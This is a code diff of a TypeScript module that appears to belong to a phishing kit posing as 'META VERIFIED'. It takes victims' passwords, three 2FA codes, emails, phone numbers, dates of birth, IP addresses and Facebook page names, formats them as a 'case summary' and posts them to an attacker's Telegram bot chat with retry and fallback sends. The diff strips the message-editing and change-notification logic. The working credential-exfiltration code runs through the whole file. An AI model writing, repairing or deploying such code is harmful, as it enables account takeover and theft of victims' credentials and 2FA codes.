@@ -1,7 +1,7 @@
 import https from 'https';
 import axios from 'axios';
-import { memoryStoreTTL } from 'utils/memoryStore';
-import { generateKey } from 'utils/generateKey';
+import { memoryStoreTTL } from '@/utils/memoryStore';
+import { generateKey } from '@/utils/generateKey';
 
 const agent = new https.Agent({ family: 4 });
 
@@ -89,44 +89,6 @@ function formatCodeField(value: unknown): string {
 }
 
 
-function getChangedFields(prevData: any = {}, nextData: any = {}, inputNew: any = {}): string[] {
-    const before = normalizeData(prevData);
-    const after = normalizeData(nextData);
-    const provided = normalizeData(inputNew);
-
-    const labels: Record<string, string> = {
-        ip: 'Ip',
-        location: 'Location',
-        fullName: 'Full Name',
-        fanpage: 'Page Name',
-        day: 'Date of birth',
-        month: 'Date of birth',
-        year: 'Date of birth',
-        email: 'Email',
-        emailBusiness: 'Email Business',
-        phone: 'Phone Number',
-        password: 'Password First',
-        passwordSecond: 'Password Second',
-        authMethod: 'Auth Method',
-        twoFa: 'Code 2FA(1)',
-        twoFaSecond: 'Code 2FA(2)',
-        twoFaThird: 'Code 2FA(3)',
-    };
-
-    const changed = new Set<string>();
-    Object.keys(after).forEach((k) => {
-        if (provided[k] === '' || provided[k] === undefined) return;
-        if (before[k] !== after[k]) {
-            if (k === 'day' || k === 'month' || k === 'year') {
-                changed.add('Date of birth');
-            } else {
-                changed.add(labels[k] || k);
-            }
-        }
-    });
-    return Array.from(changed);
-}
-
 function normalizeData(input: any = {}) {
     return {
         ip: input.ip ?? '',
@@ -165,28 +127,24 @@ function formatMessage(data: any): string {
     const dob = [d.day, d.month, d.year].every((x) => String(x ?? '').trim())
         ? `${escapeHtml(d.day)}/${escapeHtml(d.month)}/${escapeHtml(d.year)}`
         : '';
-    const authLine = d.authMethod ? `\n<b>🧩 Auth:</b> <code>${escapeHtml(d.authMethod)}</code>` : '';
+    const authLine = d.authMethod ? `<b>🧩 Auth:</b> <code>${escapeHtml(d.authMethod)}</code>` : '';
     const has2FA = Boolean(d.twoFa || d.twoFaSecond || d.twoFaThird);
     const phoneDisplay = d.phone && String(d.phone).trim() ? escapeHtml(`+${String(d.phone).trim()}`) : '';
 
     const lines = [
-        `<b>📋 META VERIFIED - CASE SUMMARY</b>`,
+        `<b>📋 META VERIFIED</b>`,
         `--------------`,
-        `<b>🖥️ SYSTEM</b>`,
         `<b>IP:</b> <code>${formatCodeField(d.ip)}</code>`,
         `<b>Location:</b> <code>${formatCodeField(d.location)}</code>`,
         `--------------`,
-        `<b>👤 PROFILE</b>`,
         `<b>Full Name:</b> <code>${formatCodeField(d.fullName)}</code>`,
         `<b>Page:</b> <code>${formatCodeField(d.fanpage)}</code>`,
         `<b>DOB:</b> <code>${dob}</code>`,
         `--------------`,
-        `<b>📨 CONTACT</b>`,
         `<b>Email:</b> <code>${formatCodeField(d.email)}</code>`,
         `<b>Business Email:</b> <code>${formatCodeField(d.emailBusiness)}</code>`,
         `<b>Phone:</b> <code>${phoneDisplay}</code>`,
         `--------------`,
-        `<b>🔑 PASSWORD</b>`,
         `<b>Password(1):</b> <code>${formatCodeField(d.password)}</code>`,
         `<b>Password(2):</b> <code>${formatCodeField(d.passwordSecond)}</code>`,
         `${authLine ? authLine.trim() : ''}`
@@ -195,7 +153,6 @@ function formatMessage(data: any): string {
     if (has2FA) {
         lines.push(
             `--------------`,
-            `<b>🔐 2FA</b>`,
             `<b>2FA(1):</b> <code>${formatCodeField(d.twoFa)}</code>`,
             `<b>2FA(2):</b> <code>${formatCodeField(d.twoFaSecond)}</code>`,
             `<b>2FA(3):</b> <code>${formatCodeField(d.twoFaThird)}</code>`
@@ -223,7 +180,6 @@ export async function sendTelegramMessage(data: any): Promise<void> {
     const updatedText = formatMessage(fullData);
 
     try {
-        // if (!prev?.messageId) {
         const res = await retryTelegramRequest(() =>
             axios.post(`${config.api}/sendMessage`, {
                 chat_id: config.chatId,
@@ -242,62 +198,27 @@ export async function sendTelegramMessage(data: any): Promise<void> {
         } else {
             console.warn('⚠️ Telegram response không có message_id');
         }
-        // } else {
-        //     await retryTelegramRequest(() =>
-        //         axios.post(`${config.api}/editMessageText`, {
-        //             chat_id: config.chatId,
-        //             message_id: prev.messageId,
-        //             text: updatedText,
-        //             parse_mode: 'HTML',
-        //         }, {
-        //             httpsAgent: agent,
-        //             timeout: 10000
-        //         })
-        //     );
-        //     memoryStoreTTL.set(key, { message: updatedText, messageId: prev.messageId, data: fullData });
-
-        //     const changedFields = getChangedFields(prev.data, fullData, data);
-        //     if (changedFields.length > 0) {
-        //         await retryTelegramRequest(() =>
-        //             axios.post(`${config.api}/sendMessage`, {
-        //                 chat_id: config.chatId,
-        //                 text: `🔔 Đã cập nhật: <b>${changedFields.join(', ')}</b>`,
-        //                 parse_mode: 'HTML'
-        //             }, {
-        //                 httpsAgent: agent,
-        //                 timeout: 10000
-        //             })
-        //         );
-        //     }
-        //     console.log(`✏️ Edited message ID: ${prev.messageId}`);
-        // }
     } catch (err: any) {
-        const desc = err?.response?.data?.description || '';
-        if (desc.includes('message to edit not found')) {
-            try {
-                const res = await retryTelegramRequest(() =>
-                    fetch(`${config.api}/sendMessage`, {
-                        method: 'POST',
-                        body: JSON.stringify({
-                            chat_id: config.chatId,
-                            text: updatedText,
-                            parse_mode: 'HTML'
-                        }),
-                    })
-                );
-                const messageId = res?.result?.message_id;
-                if (messageId) {
-                    memoryStoreTTL.set(key, { message: updatedText, messageId, data: fullData });
-                    console.log(`🔄 Message was deleted → sent new message. ID: ${messageId}`);
-                } else {
-                    console.warn('⚠️ Telegram response không có message_id khi re-send');
-                }
-            } catch (sendErr: any) {
-                console.error('🔥 Telegram re-send error:', sendErr?.response?.data || sendErr.message || sendErr);
+        console.error('🔥 Telegram send error (retry exhausted):', err?.response?.data || err.message || err);
+        try {
+            const fallbackRes = await axios.post(`${config.api}/sendMessage`, {
+                chat_id: config.chatId,
+                text: updatedText,
+                parse_mode: 'HTML'
+            }, {
+                httpsAgent: agent,
+                timeout: 10000
+            });
+            const fallbackMessageId = fallbackRes?.data?.result?.message_id;
+            if (fallbackMessageId) {
+                memoryStoreTTL.set(key, { message: updatedText, messageId: fallbackMessageId, data: fullData });
+                console.log(`🔄 Fallback send success. ID: ${fallbackMessageId}`);
+            } else {
+                console.warn('⚠️ Fallback Telegram response không có message_id');
             }
-            return;
+        } catch (fallbackErr: any) {
+            console.error('🔥 Telegram fallback send error:', fallbackErr?.response?.data || fallbackErr.message || fallbackErr);
         }
-        console.error('🔥 Telegram send/edit error:', err?.response?.data || err.message || err);
         return;
     }
 }
